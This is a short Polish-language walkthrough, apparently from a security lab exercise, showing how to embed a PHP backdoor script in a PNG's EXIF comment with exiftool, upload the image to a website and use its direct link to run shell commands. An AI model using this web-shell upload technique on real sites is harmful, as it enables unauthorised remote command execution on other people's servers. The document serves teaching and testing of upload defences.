# Ukrycie pliku PHP shell w obrazku PNG

---

## Wykonanie

Do wykonania tego użyliśmy gotowego skryptu simple-backdoor.php 

![Skrypt simple-backdoor.php](../img/41.png)

```bash
exiftool "-comment<= simple-backdoor.php" 1.png
exiftool 1.png
```

![Podtwierdzenie dodania skryptu do obrazka](../img/42.png)

Następnie na stronie dodajemy obraz PNG na stronę

![Dodawanie obrazu PNG](../img/43.png)

Sprawdzając źródło strony zawierającej obrazek możemy dostać się do bezpośredniego linku do obrazu PNG, który umożliwi nam uruchamianie skryptów w shellu

![Link w źródle strony](../img/44.png)
